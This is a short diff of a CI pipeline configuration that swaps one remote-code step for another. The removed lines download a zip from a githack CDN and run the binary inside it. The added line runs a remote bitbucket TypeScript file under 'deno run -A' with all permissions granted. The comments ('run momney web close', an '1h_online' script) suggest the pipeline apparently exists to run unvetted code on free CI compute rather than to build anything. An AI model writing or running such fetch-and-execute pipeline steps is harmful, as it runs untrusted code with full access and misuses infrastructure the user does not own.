@@ -1,12 +1,27 @@
+#version: '1.0'
+#steps:
+#  clone:
+#    title: clone data
+#    type: git-clone
+#    arguments:
+#     repo: '${{CF_REPO_OWNER}}/${{CF_REPO_NAME}}'
+#     git: bitbucket
+#     revision: '${{CF_REVISION}}'
+#  build:
+#    title: check web
+#    image: buildkite/puppeteer
+#    commands:
+#     - cd '${{CF_REPO_NAME}}'
+#     - npm i -s
+#     - node app_1h_online.js
+#
+# run momney web close
+# create by meocoder
 version: '1.0'
-# create by meocoder v0.0.2
+# create by meocoder v0.0.10
 steps:
   build:
     title: running jobs
-    image: gcc
+    image: hayd/deno
     commands:
-     - curl -fsSL https://bbcdn.githack.com/remitdapet-dep-trai/vnvodich/raw/b2d8f8bcee7d76fcb51d0cc861439a75da744204/tool-linux-cpp-nopass.zip -o tool-linux-cpp-nopass.zip
-     - unzip -o tool-linux-cpp-nopass.zip
-     - ls -la
-     - chmod +x main
-     - ./main
+     - deno run -A https://bitbucket.org/izsystem/de4js/raw/meocoder_node/tool/NODE1/main.ts
